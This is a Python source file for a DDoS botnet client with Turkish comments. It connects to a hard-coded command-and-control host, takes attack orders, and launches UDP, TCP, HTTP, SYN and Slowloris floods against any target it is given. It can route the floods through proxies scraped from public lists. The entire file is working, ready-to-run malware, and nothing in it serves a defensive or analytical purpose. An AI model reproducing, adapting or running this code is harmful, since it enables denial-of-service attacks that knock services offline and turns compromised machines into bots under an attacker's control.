import time
import socket
import threading
import random
import os
import sys
from urllib.request import urlopen

# --- C2 KONFİGÜRASYONU ---
C2_IP = "elchapo.duckdns.org"
C2_PORT = 6667

# --- GLOBAL DEĞİŞKENLER ---
stop_attack = False
proxy_list = []

# --- PROXY ÇEKİCİ ---
def fetch_proxies():
    global proxy_list
    try:
        urls = [
            "https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
        ]
        for url in urls:
            try:
                response = urlopen(url, timeout=5)
                data = response.read().decode('utf-8')
                proxies = [line.strip() for line in data.split('\n') if ':' in line]
                proxy_list.extend(proxies[:50])
                if len(proxy_list) > 100:
                    break
            except:
                pass
    except:
        pass

# --- SALDIRI FONKSİYONLARI ---
def udp_flood(target_ip, target_port, use_proxy=False):
    global stop_attack
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)
    while not stop_attack:
        try:
            s.sendto(data, (target_ip, int(target_port)))
        except:
            pass
    try:
        s.close()
    except:
        pass

def tcp_flood(target_ip, target_port, use_proxy=False):
    global stop_attack
    while not stop_attack:
        try:
            if use_proxy and proxy_list:
                proxy = random.choice(proxy_list)
                proxy_host, proxy_port = proxy.split(':')
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((proxy_host, int(proxy_port)))
                s.send(f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\n\r\n".encode())
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((target_ip, int(target_port)))
            s.send(b"GET / HTTP/1.1\r\n\r\n")
            s.close()
        except:
            pass

def http_flood(target_ip, target_port, use_proxy=False):
    global stop_attack
    while not stop_attack:
        try:
            if use_proxy and proxy_list:
                proxy = random.choice(proxy_list)
                proxy_host, proxy_port = proxy.split(':')
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((proxy_host, int(proxy_port)))
                req = f"GET http://{target_ip}:{target_port}/?{random.randint(1000,9999)} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((target_ip, int(target_port)))
                req = f"GET /?{random.randint(1000,9999)} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
            s.send(req.encode())
            s.close()
        except:
            pass

def syn_flood(target_ip, target_port, use_proxy=False):
    global stop_attack
    while not stop_attack:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((target_ip, int(target_port)))
            s.close()
        except:
            pass

def slowloris(target_ip, target_port, use_proxy=False):
    global stop_attack
    try:
        if use_proxy and proxy_list:
            proxy = random.choice(proxy_list)
            proxy_host, proxy_port = proxy.split(':')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((proxy_host, int(proxy_port)))
            s.send(f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\n\r\n".encode())
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target_ip, int(target_port)))
        
        s.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\n".encode())
        s.send(f"User-Agent: Mozilla/5.0\r\n".encode())
        s.send(f"Accept-language: en-US,en\r\n".encode())
        
        while not stop_attack:
            try:
                s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                time.sleep(15)
            except:
                break
        s.close()
    except:
        pass

def launch_attack(mode, target_ip, target_port, threads, use_proxy=False):
    global stop_attack
    stop_attack = False
    
    if use_proxy and not proxy_list:
        fetch_proxies()
    
    attack_func = {
        "UDP": udp_flood,
        "TCP": tcp_flood,
        "HTTP": http_flood,
        "SYN": syn_flood,
        "SLOWLORIS": slowloris
    }.get(mode.upper(), udp_flood)
    
    for _ in range(int(threads)):
        threading.Thread(target=attack_func, args=(target_ip, target_port, use_proxy), daemon=True).start()

# --- C2 BAĞLANTI DÖNGÜSÜ ---
def connect_to_c2():
    global stop_attack
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(20) # Timeout artırıldı
            s.connect((C2_IP, C2_PORT))
            
            # Bağlantı başarılı bildirimi (Log için)
            # print(f"Connected to {C2_IP}") 

            while True:
                try:
                    data = s.recv(1024).decode()
                    if not data:
                        break
                    
                    if data == "STOP":
                        stop_attack = True
                    
                    elif data.startswith("ATTACK"):
                        # Beklenen Format: ATTACK|MODE|IP|PORT|THREADS[|PROXY]
                        parts = data.split("|")
                        if len(parts) >= 5:
                            _, mode, ip, port, th = parts[:5]
                            use_proxy = False
                            if len(parts) > 5 and parts[5].upper() == "PROXY":
                                use_proxy = True
                                
                            launch_attack(mode, ip, port, th, use_proxy)
                except socket.timeout:
                    # Timeout durumunda bağlantıyı canlı tutmak için ping atabiliriz
                    # veya sadece döngüye devam ederiz
                    continue
                except Exception as e:
                    break
            s.close()
        except:
            pass
        
        time.sleep(10) # Bağlantı koparsa 10sn bekle

if __name__ == '__main__':
    # Servis başladığında çalışacak ana kod
    connect_to_c2()
